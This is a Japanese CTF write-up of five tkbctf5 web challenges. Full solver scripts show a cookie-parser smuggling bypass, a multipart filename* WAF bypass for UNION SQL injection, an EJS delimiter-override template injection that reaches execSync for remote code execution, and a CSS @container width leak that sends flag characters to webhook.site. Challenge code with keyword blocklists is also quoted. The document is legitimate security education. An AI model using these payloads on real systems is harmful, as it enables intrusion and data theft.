---
title: tkbctf5 Writeup
date: 2026-03-15
layout: writeup
rank: 2
total_teams: 247
team: young (coo)
language: jp
tags:
  - Web
---

tkbctf5にチームyoung (coo)で参加し、2位。webが早々に片付けられてからは椅子暖め係をやっていた。
自分が解いた問題と、webのボス問のupsolveを書く。

# [web] Patisserie (85 sovles)
**1st blood🩸**

proxyとappの二段構成になっており、proxyはpythonで、appはnodeで書かれている。

appの`/admin`へ`is_admin`というcookieが1のリクエストを飛ばすとflagが得られる。
```js
app.get("/admin", (req, res) => {
  if (req.cookies.is_admin === "1") {
    return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin - Patisserie</title>${PAGE_STYLE}</head>
<body>
${nav("Admin")}
<div class="container">
  <h1>Admin Panel</h1>
  <div class="card">
    <h2>Secret Recipe</h2>
    <p>${FLAG}</p>
  </div>
</div>
</body></html>`);
  }
  const failed = req.query.error === "1";
  res.status(403).send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Forbidden - Patisserie</title>${PAGE_STYLE}</head>
<body>
${nav(req.signedCookies.user)}
<div class="container">
  <h1>Admin Panel</h1>
  <div class="notice notice-warn">
    <span class="notice-icon">&#x1f512;</span>
    <div>You do not have permission to view this page. Please authenticate below.</div>
  </div>
  ${failed ? `<div class="notice notice-error"><span class="notice-icon">&#x2716;</span><div>Invalid password. Please try again.</div></div>` : ""}
  <div class="card">
    <h2>Admin Login</h2>
    <form action="/admin" method="POST">
      <input type="password" name="password" placeholder="Admin password" required>
      <button type="submit">Login</button>
    </form>
  </div>
  <a class="back-link" href="/recipes">&larr; Back to recipes</a>
</div>
</body></html>`);
});
```

しかし、proxy側でadminという文字列がkeyに含まれているとリクエストが弾かれてしまう。
```py
def parse_cookie_header(raw: str) -> dict[str, str]:
    sc = SimpleCookie()
    try:
        sc.load(raw)
    except Exception:
        return {}
    return {key: morsel.value for key, morsel in sc.items()}


def check_cookies(cookie_header: str) -> str | None:
    cookie_header = cookie_header.strip()
    if not cookie_header:
        return None

    cookies = parse_cookie_header(cookie_header)
    if not cookies:
        return "malformed cookie"

    if len(cookies) > MAX_COOKIES:
        return "too many cookies"

    for name in cookies:
        if "admin" in name.lower():
            return "blocked cookie"

    return None
```

この問題では、pythonとnodeのcookie parserの挙動差を利用する。具体的には、pythonのSimpleCookieではダブルクオーテーション内のセミコロンを区切りとせずそのまま値として解釈するのに対し、nodeのcookie-parserでは区切りとして解釈する。

よって、`Cookie: a="; is_admin=1; b="`のようなcookieを渡すとproxyをすり抜け、flagを得ることができる。

```py
import urllib.request
import re

TARGET_URL = "http://35.194.108.145:11198/admin"
PAYLOAD_COOKIE = 'a="; is_admin=1; b="'

def exploit():
    req = urllib.request.Request(
        TARGET_URL,
        headers={"Cookie": PAYLOAD_COOKIE},
        method="GET"
    )
    try:
        with urllib.request.urlopen(req) as response:
            html = response.read().decode("utf-8")
            match = re.search(r"tkbctf\{[^}]+\}", html)
            if match:
                print(f"[+] Flag found: {match.group(0)}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
```
`tkbctf{qu0t3d_c00k13_smuggl1ng_p4rs3r_d1ff_7d3f8a2b}`


# [web] Secure Gate (64 solves)
**1st blood🩸**

proxyとbackendの二段構成になっており、flagはsecretsテーブル内にある。
```go
flag := os.Getenv("FLAG")
if flag == "" {
    flag = "tkbctf{dummy}"
}
db.Exec("INSERT INTO secrets (value) VALUES (?)", flag)
```

また、自明なSQL Injectionが存在する。
```go
r.ParseMultipartForm(10 << 20)
q := r.FormValue("q")
if q == "" {
    jsonResponse(w, 200, []Note{})
    return
}

pattern := escapeLikePattern(q)
query := fmt.Sprintf(
    `SELECT id, title, content, created_at FROM notes WHERE content LIKE '%%%s%%' ESCAPE '\' ORDER BY created_at DESC`,
    pattern,
)
```

しかし、proxy内のWAFによって怪しいリクエストは弾かれてしまう。
```js
const SQLI_PATTERNS = [
  /'[^']*(\b(or|and|union|select|insert|update|delete|drop|alter|exec)\b|--|;)/i,
  /(union\s*(--[^\n]*\n\s*)*(all\s+)?(select|values))/i,
  /(\bselect\b[\s\S]*?\bfrom[\s"'[\x60(])/i,
  /(insert\s+into)/i,
  /(update\s+[\s\S]*?\sset\s)/i,
  /(delete\s+from)/i,
  /(drop\s+(table|database))/i,
  /(\bsleep\s*\(|\bbenchmark\s*\(|\bwaitfor\b)/i,
  /(load_file|into\s+(out|dump)file)/i,
  /\/\*[\s\S]*?\*\//,
];

function isSQLi(value) {
  return typeof value === "string" && SQLI_PATTERNS.some((p) => p.test(value));
}
```

この問題では、Content-Dispotionのパーサー差異を利用する。

`Content-Disposition: form-data; name="q"; filename="dummy"; filename*=utf-8''`というヘッダを渡すと、proxy側のnode(busboy)は`filename="dummy"`を認識し、リクエストをファイルとして扱うためWAFをすり抜けることができる。backendのgoではRFC 2231に対応しており、`filename*=utf-8''`が`filename`を上書きし、かつ`utf-8''`が空文字列として解釈されるため、form-fieldとして受理される。

これを用いてSQLiするsolverは以下の通り。
```py
import urllib.request
import json

def exploit():
    url = "http://35.194.108.145:50059/api/notes/search"
    boundary = "----WebKitFormBoundaryX"
    
    sqli_payload = "' UNION SELECT 1, value, 'x', '2025-01-01' FROM secrets WHERE '1' LIKE '"
    
    raw_body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"q\"; filename=\"dummy\"; filename*=utf-8''\r\n"
        f"\r\n"
        f"{sqli_payload}\r\n"
        f"--{boundary}--\r\n"
    ).encode('utf-8')
    
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}"
    }
    
    req = urllib.request.Request(url, data=raw_body, headers=headers, method="POST")
    
    try:
        with urllib.request.urlopen(req) as response:
            response_data = response.read().decode('utf-8')
            parsed_json = json.loads(response_data)
            
            print("[*] サーバーからの応答データ:")
            print(json.dumps(parsed_json, indent=2))
            
            for item in parsed_json:
                title = item.get("title", "")
                if "tkbctf{" in title:
                    print(f"\n[+] 抽出成功: {title}")
                    return
                    
            print("\n[-] 応答内にフラグが存在しません。")
            
    except urllib.error.URLError as e:
        print(f"[-] HTTPリクエストエラー: {e}")
        if hasattr(e, 'read'):
            print(f"詳細: {e.read().decode('utf-8')}")

if __name__ == "__main__":
    exploit()
```
`tkbctf{cr0ss1ng_th3_b0und4ry_w1th_rfc2231}`


# [web] Greeting (32 solves)
**1st blood🩸**

expressとejsを用いたアプリケーション。flagは予測困難な名前のファイル内にあるため、RCEが必要。
```js
const express = require("express");
const ejs = require("ejs");
const app = express();

const NAME_ALLOW = /^[a-zA-Z0-9<>()[\]-]+$/;
const DATA_ALLOW = /^[a-zA-Z0-9\s"{}:,/*]+$/;
const BLOCK =
  /this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa/i;

app.get("/", (req, res) => {
  const name = req.query.name ?? "world";
  const dataText = req.query.data ?? "{}";

  if (
    name.length > 80 ||
    !NAME_ALLOW.test(name) ||
    !DATA_ALLOW.test(dataText) ||
    BLOCK.test(name) ||
    BLOCK.test(dataText)
  ) {
    return res.status(403).send("Blocked");
  }

  let data;
  try {
    data = JSON.parse(dataText);
  } catch {
    return res.status(400).send("Bad JSON");
  }

  try {
    res.send(ejs.render(`<h1>Hello, ${name}</h1>`, data));
  } catch {
    res.status(500).send("Internal Server Error");
  }
});

app.listen(3000);
```

こういった問題ではSSTIからのRCEが典型だが、制約が中々厳しい。
```js
const NAME_ALLOW = /^[a-zA-Z0-9<>()[\]-]+$/;
const DATA_ALLOW = /^[a-zA-Z0-9\s"{}:,/*]+$/;
const BLOCK =
  /this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa/i;
```

しかし、よく見ると`ejs.render`に渡す`data`の型チェックがなく、Objectを渡すことができる。
例えば`{"delimiter": "a"}`を渡すことでdelimiterを上書きし、`<%`の代わりに`<a`を使うことができる。
また、RCEに必要なガジェットは`"con".concat("structor")`のようにconcatを使えばブラックリストを回避することができる。

文字数制限を満たしつつ、これが可能なsolverを書く。
```py
import base64
import json
import sys
import requests
import re

def generate_exploit_payload() -> tuple[str, str]:
    js_payload = "const cp=globalThis.process.mainModule.require('child_process');return cp.execSync('cat /flag*').toString()"

    block_pattern = re.compile(
        r"this|arguments|include|eval|Function|String|Buffer|constructor|prototype|process|global|mainModule|require|import|child|exec|spawn|env|flag|atob|btoa",
        re.IGNORECASE
    )

    valid_b64 = None
    for i in range(100):
        test_payload = js_payload + " " * i
        if len(test_payload) % 3 != 0:
            continue
        
        b64 = base64.b64encode(test_payload.encode()).decode()
        
        if '+' not in b64 and not block_pattern.search(b64):
            valid_b64 = b64
            break

    if valid_b64 is None:
        raise ValueError("制約に合致するBase64ペイロードの生成に失敗した。")

    data_obj = {
        "delimiter": "a",
        "c": "con",
        "s": "structor",
        "k": "concat",
        "g": "return glo",
        "b": "balTh",
        "i": "is",
        "a": "at",
        "o": "ob",
        "P": valid_b64
    }
    data_str = json.dumps(data_obj, separators=(',', ':'))

    # <a-escape["constructor"](escape["constructor"]("return globalThis")()["atob"](P))()a>
    name_str = "<a-escape[c[k](s)](escape[c[k](s)](g[k](b)[k](i))()[a[k](o)](P))()a>"

    return name_str, data_str

def main():
    target_url = "http://35.194.108.145:12308/"
    
    try:
        name_param, data_param = generate_exploit_payload()
        
        if len(name_param) > 80:
            raise ValueError(f"nameパラメータ長 ({len(name_param)}) が80文字を超過している。")
            
        print(f"[*] Target URL: {target_url}")
        print(f"[*] Payload Name Length: {len(name_param)}")
        print(f"[*] Executing request...")
        
        response = requests.get(target_url, params={"name": name_param, "data": data_param})
        
        print(f"[*] HTTP Status: {response.status_code}")
        print("[*] Response Text:")
        print(response.text.strip())
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
```
flagが得られた。
`tkbctf{n1c3_t0_m33t_y0u!_h0w_d1d_y0u_f1nd_m3?}`


# [web] Capture The F__l__a__g (17solves)

この問題はチームメイトが解いた問題の**upsolve**になる。(thanks for patawang!)

CSS内に埋め込まれたflagをどうにかしてXS-leaksで抜き取る問題。
```js
import express from "express";
import cookieParser from "cookie-parser";

const template = `
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <style>
      :root {
        --flag: "{{FLAG}}";
      }
      /* Your CSS here! */
      {{CSS}}
    </style>
  </head>
  <body>
    <h1>Capture The 🚩!</h1>
  </body>
</html>
`.trim();

express()
  .use(cookieParser())
  .get("/", (req, res) => {
    let { css = "", sep = "" } = req.query;
    const FLAG = req.cookies.FLAG ?? "tkbctf{dummy}";

    if (sep.length > 2) sep = "";

    const html = template
      .replace("{{FLAG}}", () => FLAG.split("").join(sep))
      .replace("{{CSS}}", () => css.replace(/[<>]/g, ""));

    res.setHeader(
      "Content-Security-Policy",
      "default-src 'none'; style-src 'unsafe-inline'; font-src 'none'; img-src *",
    );
    res.send(html);
  })
  .listen(3000);
```

任意のCSSと、flagの各文字間に任意のseparatorを挿入することができる。
CSPを見ると、cssとimgはかなり自由が利くが、他はほぼ何もできない。

さて、どうにかしてリークする方法を考える。

まず、separatorに`""`を挿入すると、flagは`"t" "k" "b" "c" "t" "f" ...`のようになる。
そして、`open-quote`, `no-open-quote`, `close-quote`を用いて良い感じのCSSを設定すると、特定番目の文字だけ描画することができる。
```css
/* index 0 */
content: open-quote;          /* t */

/* index 1 */
content: no-open-quote close-quote;   /* k */

/* index 2 */
content: no-open-quote open-quote;    /* b */

/* index 3 */
content: no-open-quote no-open-quote close-quote; /* c */
```

このようなコードでこのCSSを生成できる。
```py
def extractor_tokens(index: int) -> str:
    if index % 2 == 0:
        tokens = ["no-open-quote"] * (index // 2) + ["open-quote"]
    else:
        tokens = ["no-open-quote"] * ((index + 1) // 2) + ["close-quote"]
    return " ".join(tokens)
```

これで描画された文字の幅を外部から観測することができれば、その文字を(高々数通りに)決定できる。
描画された文字幅によって対応するリクエストを飛ばす`@container`を用意し、1文字ずつ描画→リークを試みる。
```py
for slot, (lo, hi, group) in enumerate(groups):
    ...
    css.append(
        "@container "
        f"(min-width:{format_px(lo)}px) and (max-width:{format_px(hi)}px)"
        "{h1:after{content:\"\";display:block;width:1px;height:1px;"
        f"background:url({beacon})"
        "}}"
    )
```

しかし、一部の文字は全く同じ幅を持つため、このままでは一意に決定することはできない。
そこで、normalとobliqueそれぞれのスタイルで文字幅をリークさせることで、文字を一意に決定する。

これらを自動化したsolverは以下の通り。
```py
#!/usr/bin/env python3
import argparse
import string
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass
from typing import Dict, Iterable, List, Sequence, Tuple

import requests

REPORT_BASE_DEFAULT = "http://136.110.89.226:32474/"
KNOWN_PREFIX = "tkbctf{"
TAG_ALPHABET = string.digits + string.ascii_lowercase + string.ascii_uppercase

Group = Tuple[float, float, str]


@dataclass(frozen=True)
class Probe:
    family: str
    extra_css: str
    widths: Dict[str, float]


PROBES: Dict[str, Probe] = {
    "r": Probe(
        family="FreeSans",
        extra_css=(
            'font-weight:400;'
            'font-style:normal;'
            'font-kerning:none;'
            'font-feature-settings:"kern" 0;'
            'font-variant-ligatures:none;'
            'font-variant-numeric:proportional-nums;'
            'font-synthesis:none;'
        ),
        widths={
            'A':266.40625, 'B':265.609375, 'C':283.609375, 'D':279.203125,
            'E':253.203125, 'F':239.609375, 'G':306.0, 'H':288.40625,
            'I':111.203125, 'J':211.203125, 'K':269.609375, 'L':225.203125,
            'M':338.40625, 'N':292.0, 'O':313.609375, 'P':262.40625,
            'Q':313.609375, 'R':283.609375, 'S':266.8125, 'T':252.8125,
            'U':288.0, 'V':258.0, 'W':374.8125, 'X':262.8125,
            'Y':271.203125, 'Z':246.0,
            'a':217.203125, 'b':223.609375, 'c':202.40625, 'd':223.609375,
            'e':213.203125, 'f':112.0, 'g':220.0, 'h':214.40625,
            'i':88.8125, 'j':97.203125, 'k':205.609375, 'l':85.609375,
            'm':324.8125, 'n':214.8125, 'o':213.609375, 'p':223.609375,
            'q':223.609375, 'r':132.8125, 's':197.203125, 't':112.0,
            'u':214.8125, 'v':198.40625, 'w':288.8125, 'x':190.40625,
            'y':191.203125, 'z':194.40625,
            '0':217.609375, '1':143.609375, '2':222.8125, '3':221.609375,
            '4':220.8125, '5':223.203125, '6':220.0, '7':213.609375,
            '8':222.40625, '9':220.40625,
            '_':200.0, '{':133.203125, '}':133.203125,
        },
    ),
    "o": Probe(
        family="FreeSans",
        extra_css=(
            'font-weight:400;'
            'font-style:oblique;'
            'font-kerning:none;'
            'font-feature-settings:"kern" 0;'
            'font-variant-ligatures:none;'
            'font-variant-numeric:proportional-nums;'
            'font-synthesis:none;'
        ),
        widths={
            'A':266.8125, 'B':265.609375, 'C':284.0, 'D':280.8125,
            'E':262.8125, 'F':240.40625, 'G':311.203125, 'H':288.40625,
            'I':111.203125, 'J':202.8125, 'K':266.8125, 'L':222.40625,
            'M':338.40625, 'N':292.0, 'O':308.0, 'P':258.40625,
            'Q':310.40625, 'R':283.609375, 'S':260.40625, 'T':244.40625,
            'U':288.40625, 'V':258.0, 'W':374.8125, 'X':267.609375,
            'Y':271.203125, 'Z':244.40625,
            'a':221.609375, 'b':224.40625, 'c':206.0, 'd':223.203125,
            'e':218.8125, 'f':104.0, 'g':220.8125, 'h':216.0,
            'i':88.8125, 'j':96.8125, 'k':200.8125, 'l':88.8125,
            'm':326.40625, 'n':216.0, 'o':222.40625, 'p':225.203125,
            'q':222.40625, 'r':129.609375, 's':197.203125, 't':106.0,
            'u':215.203125, 'v':198.8125, 'w':289.203125, 'x':196.0,
            'y':191.609375, 'z':200.0,
            '0':217.609375, '1':143.609375, '2':222.8125, '3':221.609375,
            '4':220.8125, '5':223.203125, '6':220.0, '7':213.609375,
            '8':222.40625, '9':220.40625,
            '_':200.0, '{':133.609375, '}':133.609375,
        },
    ),
}


def grouped_widths(widths: Dict[str, float]) -> List[Tuple[float, List[str]]]:
    groups: Dict[float, List[str]] = defaultdict(list)
    for ch, width in widths.items():
        groups[width].append(ch)
    return sorted((width, sorted(chars)) for width, chars in groups.items())


def width_intervals(widths: Dict[str, float]) -> List[Tuple[float, float, List[str]]]:
    groups = grouped_widths(widths)
    out: List[Tuple[float, float, List[str]]] = []
    for i, (width, chars) in enumerate(groups):
        lo = 0.0 if i == 0 else (groups[i - 1][0] + width) / 2.0
        hi = 10000.0 if i == len(groups) - 1 else (width + groups[i + 1][0]) / 2.0
        out.append((lo, hi, chars))
    return out


def extractor_tokens(index: int) -> str:
    if index < 0:
        raise ValueError("index must be non-negative")
    if index % 2 == 0:
        tokens = ["no-open-quote"] * (index // 2) + ["open-quote"]
    else:
        tokens = ["no-open-quote"] * ((index + 1) // 2) + ["close-quote"]
    return " ".join(tokens)


def grouped_intervals(probe_key: str) -> List[Group]:
    return [
        (lo, hi, "".join(chars))
        for lo, hi, chars in width_intervals(PROBES[probe_key].widths)
    ]


def chunked(items: Sequence[Group], size: int) -> List[List[Group]]:
    return [list(items[i : i + size]) for i in range(0, len(items), size)]


def short_tag(counter: int, slot: int) -> str:
    if slot >= len(TAG_ALPHABET):
        raise ValueError("slot out of range")
    return f"{counter:x}{TAG_ALPHABET[slot]}"


def format_px(value: float) -> str:
    text = f"{value:.2f}".rstrip("0").rstrip(".")
    return text or "0"


def build_css(
    index: int,
    probe_key: str,
    groups: Sequence[Group],
    token: str,
    counter: int,
    parity: str,
    pad_px: float = 0.0,
) -> Tuple[str, Dict[str, str]]:
    probe = PROBES[probe_key]
    tokens = extractor_tokens(index)
    quotes_decl = "body{width:fit-content;quotes:var(--flag)}"
    if parity == "odd":
        quotes_decl = 'body{width:fit-content;quotes:var(--flag) ""}'
    css = [
        "html,body{margin:0;padding:0}",
        quotes_decl,
        (
            "body:before{"
            f"content:{tokens};display:block;width:max-content;"
            f"font:400 400px/1 {probe.family};"
            f"{probe.extra_css}"
            "}"
        ),
        "h1{margin:0;width:100%;height:0;overflow:hidden;font-size:0;line-height:0;container-type:inline-size}",
    ]

    tag_to_group: Dict[str, str] = {}
    for slot, (lo, hi, group) in enumerate(groups):
        tag = short_tag(counter, slot)
        tag_to_group[tag] = group
        beacon = f"https://webhook.site/{token}/{tag}"
        lo = max(0.0, lo - pad_px)
        hi = hi + pad_px
        css.append(
            "@container "
            f"(min-width:{format_px(lo)}px) and (max-width:{format_px(hi)}px)"
            "{h1:after{content:\"\";display:block;width:1px;height:1px;"
            f"background:url({beacon})"
            "}}"
        )
    return "".join(css), tag_to_group


def build_target_url(
    index: int,
    probe_key: str,
    groups: Sequence[Group],
    token: str,
    counter: int,
    parity: str,
    pad_px: float = 0.0,
) -> Tuple[str, Dict[str, str]]:
    css, tag_to_group = build_css(
        index=index,
        probe_key=probe_key,
        groups=groups,
        token=token,
        counter=counter,
        parity=parity,
        pad_px=pad_px,
    )
    params = {
        "sep": '""',
        "css": css,
    }
    return "http://web:3000/?" + urllib.parse.urlencode(params), tag_to_group


class Solver:
    def __init__(
        self,
        report_base: str,
        parity: str | None = None,
        min_interval_sec: float = 35.0,
        poll_timeout_sec: float = 35.0,
    ):
        self.report_base = report_base.rstrip("/")
        self.min_interval_sec = min_interval_sec
        self.poll_timeout_sec = poll_timeout_sec
        self.next_send_time = 0.0
        self.session = requests.Session()
        self.token = self._create_webhook_token()
        self.seen_request_ids: set[str] = set()
        self.tag_counter = 0
        self.regular_groups = grouped_intervals("r")
        self.oblique_groups = grouped_intervals("o")
        self.regular_bins = chunked(self.regular_groups, 7)
        self.oblique_bins = chunked(self.oblique_groups, 7)
        self.parity = parity

    def _create_webhook_token(self) -> str:
        url = "https://webhook.site/token"
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
        }
        for attempt in range(1, 6):
            try:
                r = self.session.post(url, headers=headers, timeout=20)
                if r.status_code == 201:
                    token = r.json()["uuid"]
                    print(f"[+] webhook token: {token}", flush=True)
                    return token
                print(f"[!] token create failed status={r.status_code} body={r.text[:200]!r}", flush=True)
            except Exception as exc:
                print(f"[!] token create error attempt={attempt}: {type(exc).__name__}: {exc}", flush=True)
            time.sleep(min(10, attempt * 2))
        raise RuntimeError("failed to create webhook.site token")

    def _wait_rate_limit_slot(self) -> None:
        now = time.time()
        if now < self.next_send_time:
            time.sleep(self.next_send_time - now)

    def _post_report(self, target_url: str) -> None:
        self._wait_rate_limit_slot()
        url = f"{self.report_base}/api/report"
        payload = {"url": target_url}

        while True:
            try:
                r = self.session.post(url, json=payload, timeout=20)
            except Exception as exc:
                print(f"[!] report post error: {type(exc).__name__}: {exc}; retrying in 5s", flush=True)
                time.sleep(5)
                continue

            if r.status_code == 200:
                self.next_send_time = time.time() + self.min_interval_sec
                return

            if r.status_code == 429:
                retry_after = r.headers.get("retry-after")
                wait_s = 65.0
                if retry_after:
                    try:
                        wait_s = max(wait_s, float(retry_after))
                    except ValueError:
                        pass
                print(f"[!] rate-limited by bot (429). waiting {wait_s:.0f}s", flush=True)
                time.sleep(wait_s)
                continue

            print(f"[!] report status={r.status_code} body={r.text[:200]!r}; retrying in 10s", flush=True)
            time.sleep(10)

    def _fetch_requests(self) -> List[Dict]:
        url = f"https://webhook.site/token/{self.token}/requests"
        params = {"sorting": "newest", "per_page": 100}
        headers = {"Accept": "application/json"}
        r = self.session.get(url, params=params, headers=headers, timeout=20)
        r.raise_for_status()
        return r.json().get("data", [])

    def _wait_for_tags(self, valid_tags: Iterable[str], settle_sec: float = 2.5) -> List[str]:
        valid = set(valid_tags)
        end = time.time() + self.poll_timeout_sec
        hits: List[str] = []
        first_hit_at: float | None = None
        while time.time() < end:
            try:
                data = self._fetch_requests()
            except Exception as exc:
                print(f"[!] poll error: {type(exc).__name__}: {exc}", flush=True)
                time.sleep(2)
                continue

            found_new = False
            for req in data:
                req_id = req.get("uuid")
                if req_id in self.seen_request_ids:
                    continue
                self.seen_request_ids.add(req_id)
                url = req.get("url") or ""
                tag = url.rsplit("/", 1)[-1]
                if tag in valid:
                    hits.append(tag)
                    found_new = True
                    if first_hit_at is None:
                        first_hit_at = time.time()
            if hits and first_hit_at is not None:
                if (time.time() - first_hit_at) >= settle_sec and not found_new:
                    return hits
            time.sleep(1.5)
        if hits:
            return hits
        raise RuntimeError(f"no beacon for tags={sorted(valid)!r}")

    def _probe_groups(self, index: int, probe_key: str, groups: Sequence[Group], label: str, pad_px: float = 0.0) -> str:
        counter = self.tag_counter
        self.tag_counter += 1
        target, tag_to_group = build_target_url(
            index=index,
            probe_key=probe_key,
            groups=groups,
            token=self.token,
            counter=counter,
            parity=self.parity or "even",
            pad_px=pad_px,
        )
        print(
            f"[*] probe index={index} p={probe_key} parity={self.parity} stage={label} groups={len(groups)} pad={pad_px} url_len={len(target)}",
            flush=True,
        )
        self._post_report(target)
        tags = self._wait_for_tags(tag_to_group)
        uniq_tags = list(dict.fromkeys(tags))
        chars = sorted({ch for tag in uniq_tags for ch in tag_to_group[tag]})
        group = "".join(chars)
        print(f"    -> tags={uniq_tags} group={group!r}", flush=True)
        return group

    def _probe_probe(self, index: int, probe_key: str) -> str:
        bins = self.regular_bins if probe_key == "r" else self.oblique_bins
        primary: List[Group] = []
        for idx, bucket in enumerate(bins):
            primary.append((bucket[0][0], bucket[-1][1], str(idx)))
        selected_bin = int(self._probe_groups(index=index, probe_key=probe_key, groups=primary, label="coarse"))
        try:
            return self._probe_groups(index=index, probe_key=probe_key, groups=bins[selected_bin], label=f"fine{selected_bin}")
        except RuntimeError:
            return self._probe_groups(
                index=index,
                probe_key=probe_key,
                groups=bins[selected_bin],
                label=f"fine{selected_bin}p",
                pad_px=3.0,
            )

    def detect_parity(self) -> str:
        expected = {0: "t", 1: "k", 2: "b"}
        saved_parity = self.parity
        for parity in ("even", "odd"):
            self.parity = parity
            matches = 0
            try:
                for index, ch in expected.items():
                    group = self._probe_probe(index=index, probe_key="r")
                    if ch in group:
                        matches += 1
                    else:
                        break
            except Exception as exc:
                print(f"[!] parity={parity} check failed: {type(exc).__name__}: {exc}", flush=True)
                continue
            if matches == len(expected):
                print(f"[+] parity detected from known prefix: {parity}", flush=True)
                return parity
        self.parity = saved_parity
        raise RuntimeError("could not determine parity from known prefix")

    def solve_index(self, index: int) -> str:
        regular = self._probe_probe(index=index, probe_key="r")
        if regular == "{}" and index >= len(KNOWN_PREFIX):
            return "}"
        if len(regular) == 1:
            return regular

        oblique = self._probe_probe(index=index, probe_key="o")
        inter = sorted(set(regular) & set(oblique))
        if len(inter) == 1:
            return inter[0]
        if set(inter) == set("{}"):
            return "}"
        raise RuntimeError(
            f"could not resolve index {index}: regular={regular!r} oblique={oblique!r} inter={''.join(inter)!r}"
        )

    def self_test(self) -> None:
        if self.parity is None:
            self.parity = self.detect_parity()
        for index, expected in ((0, "t"), (1, "k"), (2, "b")):
            got = self.solve_index(index)
            print(f"[+] self-test index={index} expected={expected!r} got={got!r}", flush=True)
            if got != expected:
                raise RuntimeError(f"self-test failed at index {index}: expected {expected!r}, got {got!r}")

    def solve(self, prefix: str = KNOWN_PREFIX, start_index: int | None = None) -> str:
        if self.parity is None:
            self.parity = self.detect_parity()
        out = list(prefix)
        begin = start_index if start_index is not None else len(prefix)
        for index in range(begin, 28):
            ch = self.solve_index(index)
            out.append(ch)
            partial = "".join(out)
            print(f"[+] index={index} char={ch!r} partial={partial}", flush=True)
            if ch == "}":
                print(f"[+] flag: {partial}", flush=True)
                return partial
        raise RuntimeError("did not hit closing brace within max length")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--report-base", default=REPORT_BASE_DEFAULT)
    parser.add_argument("--parity", choices=["even", "odd"])
    parser.add_argument("--prefix", default=KNOWN_PREFIX)
    parser.add_argument("--start-index", type=int)
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()

    solver = Solver(report_base=args.report_base, parity=args.parity)
    if args.self_test:
        solver.self_test()
        return 0

    print(solver.solve(prefix=args.prefix, start_index=args.start_index))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```
`tkbctf{0hY0urC551sBe4ut1ful}`


# [web] Capture The F__l__a__g Revenge (2 solves)

↑のRevenge問。
cssとseparatorがstringかどうかのチェックが厳密になっていた。（sepに配列を渡すことで良い感じに解くことができたらしい）
```js
if (typeof sep !== "string" || sep.length > 2) sep = "";
if (typeof css !== "string") css = "";
```

しかし、影響はなかったのでそのまま同じsolverで解くことができた。
`tkbctf{B3c4r3fu1w1thth3Type}`
